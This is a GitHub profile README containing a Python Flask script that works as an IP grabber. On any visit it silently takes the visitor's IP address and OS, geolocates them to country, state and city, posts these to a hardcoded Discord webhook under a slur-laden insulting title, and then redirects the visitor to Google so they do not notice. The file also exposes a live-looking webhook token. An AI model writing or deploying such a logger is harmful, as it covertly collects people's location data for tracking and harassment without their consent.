- 👋 Hi, I’m @wa1ker38552

```
import requests
from flask import Flask
from flask import request
from flask import redirect

def find_index(text, i1, i2):
  x = i1
  while text[x] != i2: x += 1
  return text[i1:x]

def parseResponse(response, ip):
  start = response.index('<tr><td>'+ip)+len(ip)+8
  x = start
  while response[x:x+8] != '</tbody>': x += 1
  parse = response[start:x]
  parse = parse.replace('<td>','').replace('</tr>','')
  location = {}
  location['country'] = find_index(parse, 5, '<')[:-1]
  location['state'] = parse.split('</td>')[2].replace('\n','').replace('\t','')
  location['city'] = parse.split('</td>')[3]
  return location

def processIP():
  webhookurl = 'https://discord.com/api/webhooks/943754893687156736/4sv1mWlHRGw8q7kdaiqZPGlxNm2AS_9-Mo9vZFI9tUV907dJFkvo4G1OGZJy9jLoiwbd'

  ip = request.headers.get('x-forwarded-for')

  response = requests.post('https://www.iplocation.net/ip-lookup', data = {'query':ip, 'submit':'IP Lookup'})
  location = parseResponse(response.text, ip)

  data = {}
  data['embeds'] = [
    {
      'title': '⚠️ RETARDED BRAINDEAD PERSON FOUND! ⚠️',
      'description': '**IP:** ' + ip + '\n**OS:** ' + request.headers.get('Sec-Ch-Ua-Platform').replace('"','') + '\n**Country:** ' + location['country'] + '\n**State:** ' + location['state'] + '\n**City:** ' + location['city']
    }
  ]

  requests.post(webhookurl, json=data)

app = Flask('')

@app.route('/')
def home():
  processIP()
  return redirect('https://google.com/', code = 302)

app.run(host='0.0.0.0',port=8080)
```

<!---
wa1ker38552/wa1ker38552 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
